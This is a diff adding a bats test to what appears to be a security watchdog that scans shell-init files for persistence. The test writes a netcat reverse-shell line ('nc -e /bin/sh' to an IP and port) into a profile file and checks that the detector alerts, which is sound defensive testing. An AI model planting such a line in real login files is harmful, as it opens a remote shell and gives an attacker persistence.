@@ -259,3 +259,19 @@ seed_benign() {
     FILES_V="${PROFILE_F} ${ZSHRC} ${ZPROFILE}" run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in shell-init: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to the brain-wide nc reverse-shell variant INVARIANT
+    # family already locked. Shell-init files (/etc/profile,
+    # /etc/bash.bashrc, /etc/zsh/*, /etc/profile.d/*.sh, root
+    # dotfiles) source on every interactive login — per-login exec
+    # persistence surface (T1546). Sister-vector to bash-completion
+    # + csh-config + fish-config on the per-login source surface
+    # family.
+    seed_benign
+    run_wd
+    printf 'nc -e /bin/sh 1.1.1.1 4444\n' > "${PROFILE_F}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
